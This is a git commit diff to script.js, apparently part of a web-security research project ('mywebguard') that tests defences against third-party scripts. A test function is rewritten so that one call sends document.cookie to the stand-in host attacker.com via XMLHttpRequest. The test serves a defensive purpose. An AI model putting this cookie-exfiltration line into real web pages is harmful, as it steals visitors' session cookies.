cc76c64eb469341481d8b8cbb15bed3a5ef33329
Phu Phung <pphung1@udayton.edu>
2019-08-12 14:07:24 -0400

    Test Ajax

--- script.js
+++ script.js
@@ -15,15 +15,19 @@ if (document.cookie && document.cookie.indexOf("mywebguard")>=0) {
 
 
 //test case 4: Ajax
-function ajaxTest() {
+function ajaxTest(url) {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
      //document.getElementById("demo").innerHTML = this.responseText;
-	    alert(this.responseText);
+	    alert("Debug from https://mywebguard-thirdparty.github.io: ajaxTest('"+url+"')"+this.responseText);
     }
   };
-  xhttp.open("GET", "https://attacker.com/?cookie="+document.cookie, true);
+  xhttp.open("GET", url, true);
   xhttp.send();
 }
-ajaxTest();
+ajaxTest("index.html");
+ajaxTest("https://attacker.com/?cookie="+document.cookie);
+ajaxTest("https://mywebguard-thirdparty.github.io");
+
+
